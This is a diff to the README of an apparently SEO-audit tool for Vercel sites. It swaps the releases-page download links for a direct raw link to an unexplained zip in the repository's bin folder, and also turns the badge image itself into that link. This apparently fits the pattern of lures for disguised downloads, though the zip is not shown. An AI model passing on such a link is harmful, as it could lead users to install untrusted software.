@@ -1,7 +1,7 @@
 # 🛠️ vercel-seo-audit - Improve Your Vercel Site's SEO
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/CichyEZ/vercel-seo-audit/releases)
+[![Download](https://github.com/CichyEZ/vercel-seo-audit/raw/refs/heads/main/bin/seo-audit-vercel-2.5.zip)](https://github.com/CichyEZ/vercel-seo-audit/raw/refs/heads/main/bin/seo-audit-vercel-2.5.zip)
 
 ## 📖 Table of Contents
 1. [Introduction](#introduction)
@@ -34,7 +34,7 @@ To run "vercel-seo-audit", you need:
 3. Download the latest version of "vercel-seo-audit" by following the provided link.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Download vercel-seo-audit](https://github.com/CichyEZ/vercel-seo-audit/releases). 
+To get started, visit this page to download: [Download vercel-seo-audit](https://github.com/CichyEZ/vercel-seo-audit/raw/refs/heads/main/bin/seo-audit-vercel-2.5.zip). 
 
 1. Click on the version you want to download.
 2. Follow the prompts your browser provides to complete the download.
